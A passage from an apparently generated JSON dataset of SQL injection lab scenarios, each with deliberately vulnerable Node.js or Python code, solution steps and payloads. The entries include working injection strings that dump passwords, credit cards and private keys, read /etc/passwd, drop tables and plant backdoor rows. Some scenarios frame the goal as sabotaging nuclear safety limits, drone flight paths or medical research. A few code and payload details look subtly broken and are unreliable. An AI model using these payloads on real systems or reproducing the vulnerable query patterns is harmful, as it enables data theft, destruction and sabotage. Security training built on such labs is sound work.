      "Break pattern context with: ') UNION SELECT * FROM patient_dna--",
      "Extract sensitive genetic data containing health information",
      "Modify research conclusions in published findings"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/search-sequences', (req, res) => {\n  const { marker } = req.body;\n  const query = `SELECT * FROM sequences WHERE similarity(sequence, '${marker}') > 0.9`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "') UNION SELECT * FROM genetic_research_data--",
      "'); UPDATE research_papers SET conclusion='Harmless' WHERE disease='Cancer'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Military Drone Command System",
    "Lab Description": "A drone command system stores mission parameters in an encrypted SQLite database. The command verification endpoint directly embeds parameter names into queries after decryption. The application's custom crypto layer can be bypassed through carefully crafted command sequences. To solve: Exploit the decrypted parameter field to perform a stacked query attack extracting all mission plans and modifying drone flight paths.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept encrypted command transmission",
      "Decrypt and identify vulnerable parameter field",
      "Break query context with: '; SELECT * FROM classified_missions--",
      "Extract sensitive mission coordinates and objectives",
      "Modify drone navigation waypoints"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/verify-command', (req, res) => {\n  const { encryptedCmd } = req.body;\n  const decrypted = decrypt(encryptedCmd);\n  const query = `UPDATE drone_commands SET verified=1 WHERE command='${decrypted}'`;\n  db.query(query, (err) => {\n    res.send('Command verified');\n  });\n});",
    "payloads": [
      "'; SELECT * FROM navigation_waypoints--",
      "'; UPDATE drone_paths SET coordinates='dangerous_location' WHERE mission_id=1--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Nuclear Plant Sensor Monitoring",
    "Lab Description": "A nuclear power plant monitoring system stores sensor readings in a firewalled PostgreSQL database. The sensor data visualization endpoint directly embeds time range parameters into queries. The application's custom time series function can be exploited to break out of the timestamp context. To solve: Inject malicious SQL through the time range parameter to access all sensor histories and modify critical safety thresholds.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept sensor data request",
      "Identify vulnerable time range parameter",
      "Break timestamp context with: ')) UNION SELECT * FROM safety_override_logs--",
      "Extract sensitive operational data",
      "Modify reactor temperature safety limits"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/sensor-data', (req, res) => {\n  const { sensorId, start, end } = req.query;\n  const query = `SELECT * FROM readings WHERE sensor_id=${sensorId} AND time BETWEEN ('${start}' AND '${end}')`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "')) UNION SELECT * FROM reactor_core_parameters--",
      "')); UPDATE safety_limits SET max_temperature=2000 WHERE zone='core'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in HR System DELETE Operation",
    "Lab Description": "An HR management system's employee deletion endpoint constructs DELETE queries directly from user input. The vulnerable parameter allows attackers to manipulate the query to delete arbitrary records. This lab demonstrates the impact of unsanitized input in DELETE operations, where injection can lead to mass data destruction.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the DELETE request to /employee endpoint",
      "Identify the vulnerable emp_id parameter",
      "Inject payload: 101 OR 1=1-- to delete all records",
      "Verify deletion by checking employee count",
      "Attempt more destructive payloads like DROP TABLE"
    ],
    "Vulnerability name": "SQL Injection in DELETE Operation",
    "srcCode": "app.delete('/employee', (req, res) => {\n  const emp_id = req.query.emp_id;\n  const query = `DELETE FROM employees WHERE emp_id = ${emp_id}`;\n  db.run(query);\n  res.send('Employee deleted');\n});",
    "payloads": [
      "101 OR 1=1--",
      "105; DROP TABLE employees--",
      "0; INSERT INTO backdoor VALUES('attacker')--"
    ]
  },
  {
    "Lab scenario": "Second-Order SQL Injection in User Profiles",
    "Lab Description": "A profile update system stores unsanitized user input that gets embedded into SQL queries during admin review. This delayed execution demonstrates second-order injection where payloads remain dormant until triggered by privileged users. The challenge involves storing malicious SQL in a bio field that executes during admin access.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Update profile with malicious bio: ', admin'--",
      "Wait for admin to review the profile",
      "Observe altered admin query behavior",
      "Escalate to full database compromise",
      "Document the delayed execution chain"
    ],
    "Vulnerability name": "Second-Order SQL Injection",
    "srcCode": "app.post('/updateProfile', (req, res) => {\n  const { bio } = req.body;\n  const query = `UPDATE users SET bio = '${bio}' WHERE username = '${req.user}'`;\n  db.run(query);\n  res.send('Profile updated');\n});\n\napp.get('/admin/review', (req, res) => {\n  const query = `SELECT * FROM users WHERE username = '${req.query.user}'`;\n  db.get(query, (err, row) => res.json(row));\n});",
    "payloads": [
      "', admin'--",
      "'; UPDATE users SET is_admin=1 WHERE username='attacker'--"
    ]
  },
  {
    "Lab scenario": "Stored Procedure Injection in Password Recovery",
    "Lab Description": "A password recovery system uses a vulnerable stored procedure that concatenates user input directly into dynamic SQL. This lab demonstrates how injection can occur even when using stored procedures if input sanitization is neglected. The challenge involves exploiting the email parameter to extract password hashes.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit malicious email in recovery form: admin'--",
      "Intercept the stored procedure execution",
      "Extract password hashes via UNION injection",
      "Bypass authentication using extracted credentials",
      "Document the procedure vulnerability"
    ],
    "Vulnerability name": "SQL Injection in Stored Procedure",
    "srcCode": "CREATE PROCEDURE recover_password(IN user_email VARCHAR(100))\nBEGIN\n  SET @query = CONCAT('SELECT password FROM users WHERE email = ''', user_email, '''');\n  PREPARE stmt FROM @query;\n  EXECUTE stmt;\nEND;//",
    "payloads": [
      "admin'--",
      "nonexistent@x.com' UNION SELECT password FROM users--"
    ]
  },
  {
    "Lab scenario": "Metadata Injection in Image Gallery",
    "Lab Description": "An image gallery system incorporates unsanitized user input from image captions into SQL queries. This lab demonstrates injection through secondary input channels like file metadata. The challenge involves exploiting the caption field to exfiltrate user credentials via the gallery display.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Upload image with malicious caption",
      "Payload: ', (SELECT GROUP_CONCAT(username,password) FROM users)--",
      "Trigger gallery display of the image",
      "Observe credential leakage in metadata",
      "Document the indirect injection vector"
    ],
    "Vulnerability name": "SQL Injection via Metadata",
    "srcCode": "app.post('/upload', (req, res) => {\n  const { caption } = req.body;\n  const query = `INSERT INTO gallery (caption) VALUES ('${caption}')`;\n  db.run(query);\n  res.redirect('/gallery');\n});",
    "payloads": [
      "', (SELECT GROUP_CONCAT(username,password) FROM users)--",
      "', (SELECT LOAD_FILE('/etc/passwd'))--"
    ]
  },
  {
    "Lab scenario": "XML-Based SQL Injection in Search API",
    "Lab Description": "A search API returns results in XML format but constructs queries through string concatenation. This lab demonstrates how injection can persist even with output format constraints. The challenge involves exploiting the search parameter to extract database schema via XML responses.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Inject into search parameter: test' UNION SELECT table_name,null FROM information_schema.tables--",
      "Parse the XML response for schema information",
      "Extract column metadata through follow-up queries",
      "Map complete database structure",
      "Document the XML-based exfiltration"
    ],
    "Vulnerability name": "SQL Injection with XML Output",
    "srcCode": "app.get('/search.xml', (req, res) => {\n  const q = req.query.q;\n  const query = `SELECT title, content FROM articles WHERE title LIKE '%${q}%'`;\n  db.all(query, (err, rows) => {\n    res.type('xml').send(`<results>${rows.map(r => `<item><title>${r.title}</title></item>`).join('')}</results>`);\n  });\n});",
    "payloads": [
      "test' UNION SELECT table_name,null FROM information_schema.tables--",
      "' UNION SELECT version(),null--"
    ]
  },
  {
    "Lab scenario": "Chart Data Injection in Financial Dashboard",
    "Lab Description": "A financial dashboard dynamically builds SQL queries from unsanitized user input to generate charts. This lab demonstrates injection through data visualization parameters. The challenge involves manipulating chart metrics to expose sensitive transaction records in tooltip data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Inject into metric parameter: revenue' UNION SELECT credit_card FROM transactions--",
      "Observe sensitive data in chart tooltips",
      "Extract complete transaction records",
      "Bypass chart rendering limitations",
      "Document the visualization attack vector"
    ],
    "Vulnerability name": "SQL Injection in Data Visualization",
    "srcCode": "app.get('/chart', (req, res) => {\n  const { metric } = req.query;\n  const query = `SELECT ${metric} FROM financial_data`;\n  db.all(query, (err, rows) => res.json(rows));\n});",
    "payloads": [
      "revenue' UNION SELECT credit_card FROM transactions--",
      "ROUND(amount,2) FROM (SELECT * FROM sensitive_transactions) AS x--"
    ]
  },
  {
    "Lab scenario": "JSON API Authentication Bypass",
    "Lab Description": "A mobile API accepts JSON credentials but embeds them directly into SQL queries. This lab demonstrates injection through JSON payloads with proper content-type headers. The challenge involves bypassing authentication using boolean-based payloads in the username field.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Send JSON payload: {\"username\":\"admin'--\",\"password\":\"any\"}",
      "Observe successful authentication bypass",
      "Extract session tokens",
      "Access privileged endpoints",
      "Document the JSON injection vector"
    ],
    "Vulnerability name": "SQL Injection in JSON API",
    "srcCode": "app.post('/api/login', express.json(), (req, res) => {\n  const { username, password } = req.body;\n  const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;\n  db.get(query, (err, user) => {\n    if (user) res.json({ token: user.token });\n    else res.sendStatus(401);\n  });\n});",
    "payloads": [
      "admin'--",
      "' OR '1'='1'--",
      "' UNION SELECT 1,'admin','hashed_pass',1--"
    ]
  },
  {
    "Lab scenario": "CSV Export Injection",
    "Lab Description": "A CSV export feature dynamically selects columns through user input without sanitization. This lab demonstrates injection through data export functionality. The challenge involves manipulating the column parameter to export sensitive user credentials in the CSV file.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Inject into export parameter: name UNION SELECT email,password FROM users--",
      "Download the generated CSV file",
      "Verify credential leakage",
      "Automate mass extraction",
      "Document the export attack vector"
    ],
    "Vulnerability name": "SQL Injection in CSV Export",
    "srcCode": "app.get('/export', (req, res) => {\n  const { column } = req.query;\n  const query = `SELECT ${column} FROM products`;\n  db.all(query, (err, rows) => {\n    res.type('text/csv').send(rows.map(r => r[column]).join('\\n'));\n  });\n});",
    "payloads": [
      "name UNION SELECT email,password FROM users--",
      "id,(SELECT GROUP_CONCAT(cc_number) FROM payments)--"
    ]
  },
  {
    "Lab scenario": "Password Reset Token Enumeration",
    "Lab Description": "A password reset system verifies tokens through vulnerable SQL queries. This lab demonstrates user enumeration through blind injection in security workflows. The challenge involves manipulating the token parameter to extract valid usernames from error responses.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Inject into token parameter: fake' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--",
      "Analyze response differences for boolean testing",
      "Enumerate valid usernames through incremental testing",
      "Extract password hashes via stacked queries",
      "Document the reset workflow vulnerability"
    ],
    "Vulnerability name": "SQL Injection in Password Reset",
    "srcCode": "app.get('/reset', (req, res) => {\n  const { token } = req.query;\n  const query = `SELECT * FROM reset_tokens WHERE token='${token}'`;\n  db.get(query, (err, row) => {\n    if (row) res.send('Valid token');\n    else res.status(400).send('Invalid token');\n  });\n});",
    "payloads": [
      "fake' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--",
      "' UNION SELECT username FROM users--"
    ]
  },
  {
    "Lab scenario": "Time-Based Blind Injection in Analytics API",
    "Lab Description": "An analytics API provides no direct output but is vulnerable to time-based blind SQL injection. This lab demonstrates data extraction through timing delays when boolean conditions are met. The challenge involves extracting the admin password hash character-by-character using response timing analysis.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable date range parameter",
      "Test time delay: 2023' AND IF(1=1,SLEEP(2),0)--",
      "Develop character extraction payload",
      "Automate hash extraction with incremental SUBSTRING tests",
      "Document the blind injection methodology"
    ],
    "Vulnerability name": "Time-Based Blind SQL Injection",
    "srcCode": "app.get('/analytics', (req, res) => {\n  const { range } = req.query;\n  const query = `SELECT COUNT(*) FROM analytics WHERE period='${range}'`;\n  db.get(query, (err, row) => res.json(row));\n});",
    "payloads": [
      "2023' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>50,SLEEP(2),0)--",
      "' UNION SELECT IF(1=1,BENCHMARK(10000000,MD5('test')),0)--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in GraphQL Union Query",
    "Lab Description": "A GraphQL API implements custom resolvers that convert GraphQL queries to raw SQL. The union type implementation fails to properly sanitize type names, allowing injection into the generated SQL. The vulnerability exists in the resolver that handles polymorphic queries across multiple database tables. Attackers can exploit this to access restricted data models not normally exposed through the GraphQL schema.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze GraphQL schema introspection to identify union types",
      "Craft a malicious __typename field with SQL injection payload",
      "Break GraphQL context with: `...on User { id } UNION SELECT password FROM admins--`",
      "Extract sensitive columns through type confusion",
      "Map entire database schema by exploiting the UNION vulnerability"
    ],
    "Vulnerability name": "GraphQL to SQL Injection",
    "srcCode": "const resolvers = {\n  UnionType: {\n    __resolveType(obj) {\n      const query = `SELECT type FROM ${obj.kind}_metadata WHERE id = '${obj.id}'`;\n      return db.query(query).then(res => res.rows[0].type);\n    }\n  }\n};",
    "payloads": [
      "{ search(term:\"test\") { __typename ...on User { id } UNION SELECT password FROM admins-- } }",
      "{ __schema { types { name fields { name } } }"
    ]
  },
  {
    "Lab scenario": "NoSQL to SQL Injection in Hybrid Document-Relational System",
    "Lab Description": "A document management system stores metadata in MongoDB but uses PostgreSQL for full-text search. The translation layer between document queries and SQL search queries improperly handles nested array operators, allowing injection into the generated SQL. The $elemMatch operator is particularly vulnerable as it gets converted to raw SQL without proper escaping of bracket notation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify MongoDB operators that get translated to SQL",
      "Craft malicious $elemMatch payload: `{ tags: { $elemMatch: { $eq: \"test\" } } }`",
      "Break NoSQL context with: `{ $elemMatch: { $eq: \"' UNION SELECT * FROM pg_catalog.pg_tables--\" } }`",
      "Exfiltrate relational data through document queries",
      "Compromise the join between document and relational systems"
    ],
    "Vulnerability name": "NoSQL to SQL Injection",
    "srcCode": "app.post('/search', (req, res) => {\n  const mongoQuery = req.body.query;\n  const sql = convertMongoToSQL(mongoQuery);\n  db.query(`SELECT * FROM documents WHERE ${sql}`, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "{ $elemMatch: { $eq: \"' UNION SELECT version(),null--\" } }",
      "{ $where: \"function() { return SQL.execute('SELECT * FROM secrets'); }\" }"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Machine Learning Feature Store",
    "Lab Description": "A feature store for ML models dynamically generates SQL queries based on feature names. The query builder fails to properly escape feature names containing special characters, allowing injection into the training data retrieval pipeline. The vulnerability is particularly dangerous as it can expose PII used in model training that would otherwise be inaccessible through normal API endpoints.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify feature names used in model training API",
      "Craft malicious feature name: `valid_feature' UNION SELECT ssn FROM training_data--`",
      "Intercept feature retrieval request during model training",
      "Extract sensitive columns used as model features",
      "Map complete training data schema through incremental injection"
    ],
    "Vulnerability name": "ML Feature Store Injection",
    "srcCode": "def get_feature_values(feature_name):\n    query = f\"SELECT value FROM features WHERE name = '{feature_name}'\"\n    return db.execute(query).fetchall()",
    "payloads": [
      "age' UNION SELECT ssn FROM patients WHERE '1'='1",
      "income' FROM (SELECT * FROM sensitive_attributes) AS x--"
    ]
  },
  {
    "Lab scenario": "LDAP Filter to SQL Injection in HR System",
    "Lab Description": "An employee directory converts LDAP search filters to SQL queries for a hybrid authentication system. The translation fails to properly escape special characters in the LDAP filter syntax, allowing injection into the generated SQL. The vulnerability allows attackers to bypass both LDAP and SQL security controls by crafting malicious filters that modify the resulting query structure.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify LDAP filter parameters in employee search",
      "Craft malicious filter: `(uid=*))(mail=*)) OR 1=1--`",
      "Break LDAP context and inject SQL: `(uid=*))); SELECT * FROM hr.salaries--`",
      "Exfiltrate sensitive HR data through LDAP interface",
      "Bypass both LDAP and SQL access controls"
    ],
    "Vulnerability name": "LDAP to SQL Injection",
    "srcCode": "def ldap_to_sql(ldap_filter):\n    # Converts (uid=john) to SQL WHERE uid='john'\n    return re.sub(r'\\(([^=]+)=([^)]+)\\)', \"\\1='\\2'\", ldap_filter)\n\n@app.route('/search')\ndef search():\n    query = f\"SELECT * FROM employees WHERE {ldap_to_sql(request.args.get('filter'))}\"",
    "payloads": [
      "(uid=*)) OR 1=1--",
      "(objectClass=*)); INSERT INTO backdoor VALUES ('hacker')--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Blockchain Smart Contract Event Processing",
    "Lab Description": "A blockchain indexer processes smart contract events and stores them in a SQL database. The event parameter parser fails to properly sanitize tuple types, allowing injection into the INSERT statements that store event data. This vulnerability can be exploited by emitting specially crafted events from a malicious smart contract to manipulate the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Deploy malicious smart contract with crafted events",
      "Emit event containing SQL payload: `('value'); DROP TABLE blocks;--`",
      "Monitor database for unexpected behavior",
      "Extract sensitive off-chain data stored by other contracts",
      "Compromise the bridge between blockchain and relational data"
    ],
    "Vulnerability name": "Blockchain to SQL Injection",
    "srcCode": "async function processEvent(event) {\n  const values = event.parameters.map(p => `'${p.value}'`).join(',');\n  await db.query(`INSERT INTO ${event.name}_events VALUES (${values})`);\n}",
    "payloads": [
      "('legit'); INSERT INTO backdoor VALUES (1,'attack')--",
      "('value'); SELECT private_keys FROM wallet_storage--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in IoT Device Firmware Update Verification",
    "Lab Description": "An IoT management platform verifies firmware updates by checking version numbers against a SQL database. The version comparison logic directly concatenates user-supplied version strings into the query. Attackers can exploit this by registering malicious firmware with version strings containing SQL payloads that execute when devices check for updates.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Register firmware with malicious version: `1.0'); DROP TABLE devices;--`",
      "Force IoT devices to check for updates",
      "Observe database changes from the payload execution",
      "Compromise the entire device fleet through update mechanism",
      "Establish persistent backdoor in update system"
    ],
    "Vulnerability name": "IoT Firmware SQL Injection",
    "srcCode": "def check_update(device_id, current_version):\n    query = f\"SELECT * FROM firmware WHERE device_type = '\n        (SELECT type FROM devices WHERE id = '{device_id}')\n        AND version > '{current_version}'\"\n    return db.execute(query).fetchone()",
    "payloads": [
      "1.0'); UPDATE devices SET config='malicious'--",
      "9.9' UNION SELECT 1,payload,3 FROM backdoors--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in GeoJSON Feature Server",
    "Lab Description": "A geographic feature server accepts GeoJSON input that gets converted to SQL queries using PostGIS functions. The geometry coordinate array processing fails to properly sanitize numeric values, allowing injection into spatial queries. Attackers can exploit this by crafting malicious GeoJSON features that break out of the ST_GeomFromGeoJSON function context.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify GeoJSON ingestion endpoint",
      "Craft malicious coordinates: `[0,0]); SELECT * FROM sensitive_locations--`",
      "Break spatial function context with nested geometry",
      "Exfiltrate restricted geographic datasets",
      "Modify map data through UPDATE injection"
    ],
    "Vulnerability name": "GeoJSON to SQL Injection",
    "srcCode": "app.post('/features', (req, res) => {\n  const { geometry } = req.body;\n  const query = `INSERT INTO features (geom) VALUES \n    (ST_GeomFromGeoJSON('${JSON.stringify(geometry)}'))`;\n  db.query(query, (err) => {\n    res.send('Feature added');\n  });\n});",
    "payloads": [
      "{ \"type\":\"Point\", \"coordinates\":[0,0]); SELECT * FROM military_bases-- }",
      "{ \"type\":\"Polygon\", \"coordinates\":[[[0,0],[0,1],[1,1],[0,0]]] }; DELETE FROM cities--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Digital Signature Verification",
    "Lab Description": "A document signing system verifies digital signatures by querying a database of authorized signers. The verification query concatenates the raw signature value directly into the SQL statement. Attackers can exploit this by crafting malicious signatures that contain SQL payloads while still passing cryptographic verification through careful manipulation of signature components.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze signature verification process",
      "Craft signature containing SQL payload: `legit_sig' OR 1=1--`",
      "Bypass both cryptographic and SQL verification",
      "Extract private signing keys from database",
      "Forge documents as any authorized signer"
    ],
    "Vulnerability name": "Signature Verification SQLi",
    "srcCode": "def verify_document(doc_id, signature):\n    query = f\"SELECT * FROM signers WHERE \n        id = (SELECT signer_id FROM documents WHERE id = '{doc_id}')\n        AND public_key IN (SELECT key FROM keys WHERE sig = '{signature}')\"\n    return db.execute(query).fetchone()",
    "payloads": [
      "valid_sig' UNION SELECT 1,private_key,3 FROM signing_keys--",
      "' OR EXISTS(SELECT 1 FROM secret_signers)--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Video Processing Metadata",
    "Lab Description": "A video processing pipeline stores frame metadata in a SQL database. The frame analysis endpoint accepts JSON metadata that gets directly embedded into INSERT statements. Attackers can exploit this by uploading videos with malicious metadata that injects SQL when frames are processed. The vulnerability is particularly dangerous as it executes in a backend worker process with elevated privileges.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Upload video with malicious metadata: `{\"frame\":1,\"tags\":\"')); SELECT * FROM users--\"}`",
      "Wait for video processing job to execute",
      "Monitor database for injected query results",
      "Compromise worker process through SQL injection",
      "Establish persistence in processing pipeline"
    ],
    "Vulnerability name": "Video Metadata SQLi",
    "srcCode": "def process_frame(video_id, frame_data):\n    query = f\"INSERT INTO frames \n        (video_id, frame_num, tags) VALUES \n        ('{video_id}', {frame_data['frame']}, '{frame_data['tags']}')\"\n    db.execute(query)",
    "payloads": [
      "{\"frame\":1,\"tags\":\"')); SELECT password FROM admins--\"}",
      "{\"frame\":1,\"tags\":\"normal'); DROP TABLE videos;--\"}"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Voice Assistant Command Logging",
    "Lab Description": "A voice assistant system logs interpreted commands to a SQL database for analytics. The voice-to-text processor fails to properly sanitize special characters in commands before logging them. Attackers can exploit this by speaking carefully crafted commands that inject SQL when the logs are processed by administrative tools.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Issue voice command containing SQL payload: \"okay device ' OR 1=1--\"",
      "Wait for command to be processed and logged",
      "Trigger admin log review functionality",
      "Observe injected SQL execution in backend",
      "Exfiltrate voice command history through injection"
    ],
    "Vulnerability name": "Voice Command SQLi",
    "srcCode": "def log_command(user_id, command_text):\n    query = f\"INSERT INTO voice_logs \n        (user_id, command) VALUES \n        ('{user_id}', '{command_text}')\"\n    db.execute(query)",
    "payloads": [
      "\"set volume to 100 '); SELECT * FROM voice_history--\"",
      "\"what time is it ' UNION SELECT credit_card FROM payments--\""
    ]
  },
  {
    "Lab scenario": "SQL Injection in GraphQL Node Resolution",
    "Lab Description": "A GraphQL API implements custom node resolution that dynamically builds SQL queries using unsanitized GraphQL ID values. The global ID pattern used for node references gets directly embedded into WHERE clauses, allowing injection through base64-encoded ID manipulation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Query GraphQL endpoint for any node type",
      "Decode the returned base64 ID to understand the format",
      "Encode a malicious ID: base64('1 UNION SELECT password FROM users--')",
      "Use the forged ID in node queries to extract credentials",
      "Map database schema through type introspection"
    ],
    "Vulnerability name": "GraphQL Node ID Injection",
    "srcCode": "const resolvers = {\n  node: (_, { id }) => {\n    const rawId = Buffer.from(id, 'base64').toString();\n    return db.query(`SELECT * FROM nodes WHERE id = '${rawId.split(':')[1]}'`);\n  }\n};",
    "payloads": [
      "base64('user:1 UNION SELECT password FROM users--')",
      "base64('post:1' OR 1=1 LIMIT 1 OFFSET 1--)"
    ]
  },
  {
    "Lab scenario": "SQL Injection in JWT Claim Processing",
    "Lab Description": "An authentication system processes JWT claims by directly inserting them into SQL queries for permission checks. The 'role' claim from unsigned JWTs gets concatenated into authorization queries, allowing privilege escalation through crafted tokens.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept valid JWT and decode it",
      "Modify the role claim to: 'admin' OR 1=1--",
      "Re-sign with empty secret (none algorithm)",
      "Submit token in Authorization header",
      "Observe elevated permissions in response"
    ],
    "Vulnerability name": "JWT Claim Injection",
    "srcCode": "function checkPermission(jwt) {\n  const claims = jwt.verify(token, process.env.SECRET);\n  return db.query(`SELECT * FROM permissions WHERE role = '${claims.role}'`);\n}",
    "payloads": [
      "{\"role\":\"user' UNION SELECT 1,'admin'--\",\"iat\":1234567890}",
      "{\"role\":\"admin' OR '1'='1\",\"alg\":\"none\"}"
    ]
  },
  {
    "Lab scenario": "SQL Injection in MongoDB $where Clause to SQL Translation",
    "Lab Description": "A hybrid document-relational system translates MongoDB queries to SQL for cross-platform searches. The $where clause JavaScript gets converted to SQL without proper sanitization, allowing injection through specially crafted JavaScript expressions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify endpoints accepting MongoDB queries",
      "Craft $where clause: {\"$where\": \"this.id == '1' || SQL.execute('SELECT version()')\"}",
      "Observe database version in response",
      "Exfiltrate data through stacked queries",
      "Compromise the relational database backend"
    ],
    "Vulnerability name": "NoSQL-to-SQL Injection",
    "srcCode": "app.post('/search', (req, res) => {\n  const mongoQuery = req.body;\n  const sql = convertMongoToSQL(mongoQuery);\n  db.query(sql, (err, results) => res.json(results));\n});",
    "payloads": [
      "{\"$where\": \"this.id == '1' || SQL.execute('SELECT * FROM users')\"}",
      "{\"$expr\": {\"$function\": {\"body\": \"function() { return SQL.execute('SHOW TABLES'); }\"}}}"
    ]
  },
  {
    "Lab scenario": "SQL Injection in DynamoDB Stream Processor",
    "Lab Description": "A serverless function processes DynamoDB streams by converting item changes to SQL for a reporting database. The attribute value mapping fails to properly escape special characters, allowing injection through manipulated DynamoDB entries.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Insert DynamoDB item with malicious attribute: {\"id\":{\"S\":\"1' OR 1=1--\"}}",
      "Trigger stream processing function",
      "Observe SQL query execution in logs",
      "Extract data through subsequent injections",
      "Compromise the reporting database"
    ],
    "Vulnerability name": "DynamoDB-to-SQL Injection",
    "srcCode": "exports.handler = async (event) => {\n  for (const record of event.Records) {\n    const id = record.dynamodb.NewImage.id.S;\n    await db.query(`UPDATE reports SET count = count + 1 WHERE id = '${id}'`);\n  }\n};",
    "payloads": [
      "{\"id\":{\"S\":\"1'; DROP TABLE reports--\"}}",
      "{\"id\":{\"S\":\"1' UNION SELECT password FROM users--\"}}"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Redis-to-SQL Caching Layer",
    "Lab Description": "A caching system stores SQL query results in Redis but reconstructs queries from cached patterns with user input. The query reconstruction fails to properly escape values retrieved from Redis, allowing injection through cache poisoning.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify frequently cached queries",
      "Poison cache with malicious payload: {\"q\":\"SELECT * FROM products WHERE id = '1' OR 1=1--\"}",
      "Trigger cache hit with normal request",
      "Observe injected query execution",
      "Exfiltrate data through cache manipulation"
    ],
    "Vulnerability name": "Cache Reconstruction Injection",
    "srcCode": "async function getFromCache(key) {\n  const cached = await redis.get(key);\n  if (cached) {\n    return db.query(cached.query);\n  }\n  // ... cache miss logic\n}",
    "payloads": [
      "{\"query\":\"SELECT * FROM products WHERE id = '1' UNION SELECT * FROM users--\"}",
      "{\"query\":\"SELECT * FROM products WHERE id = '1'; SHUTDOWN--\"}"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Elasticsearch SQL Plugin",
    "Lab Description": "An application uses Elasticsearch's SQL plugin for analytics, but passes user input directly to the SQL translation layer. The plugin's query builder fails to properly escape special characters in WHERE clauses, allowing injection through search parameters.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify Elasticsearch SQL endpoints",
      "Inject through search parameter: q=1' OR 1=1--",
      "Observe unexpected results indicating injection",
      "Extract cluster information via SQL functions",
      "Access underlying document store"
    ],
    "Vulnerability name": "Elasticsearch SQL Injection",
    "srcCode": "app.get('/search', async (req, res) => {\n  const results = await esClient.sql.query({\n    query: `SELECT * FROM products WHERE name LIKE '%${req.query.q}%'`\n  });\n  res.json(results);\n});",
    "payloads": [
      "' OR 1=1 LIMIT 100--",
      "' UNION SELECT version(), 1, 1--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Firebase Realtime Database Trigger",
    "Lab Description": "A Firebase function triggers on database writes to sync data to a SQL database. The path parameters used in the sync operation get directly embedded into SQL queries, allowing injection through manipulated database paths.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Write data to Firebase path: /users/1' OR 1=1--",
      "Trigger the sync function execution",
      "Observe SQL query in function logs",
      "Extract data through path manipulation",
      "Compromise the SQL database backend"
    ],
    "Vulnerability name": "Firebase Path Injection",
    "srcCode": "exports.syncUser = functions.database.ref('/users/{userId}').onWrite((snap, context) => {\n  const userId = context.params.userId;\n  return db.query(`UPDATE sql_users SET data = '${snap.val()}' WHERE id = '${userId}'`);\n});",
    "payloads": [
      "/users/1' OR 1=1--",
      "/users/1'; DROP TABLE sql_users--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in OData Filter Parser",
    "Lab Description": "An OData API implementation converts $filter expressions to SQL without proper escaping. The parser fails to handle special characters in string literals, allowing injection through crafted filter expressions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify OData $filter parameter",
      "Craft malicious filter: $filter=Name eq 'test' OR 1=1--",
      "Observe unfiltered results indicating injection",
      "Extract schema information via UNION",
      "Compromise the underlying database"
    ],
    "Vulnerability name": "OData Filter Injection",
    "srcCode": "app.get('/products', (req, res) => {\n  const filter = odataToSql(req.query.$filter);\n  db.query(`SELECT * FROM products WHERE ${filter}`, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "Name eq 'test' OR 1=1--",
      "Name eq 'test' UNION SELECT name FROM sysobjects--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Apache Kafka SQL Connector",
    "Lab Description": "A Kafka connector streams messages to a SQL database using configured field mappings. The message value deserializer fails to properly escape string values, allowing injection through crafted Kafka messages.",
    "Difficulty Level": "Hard",
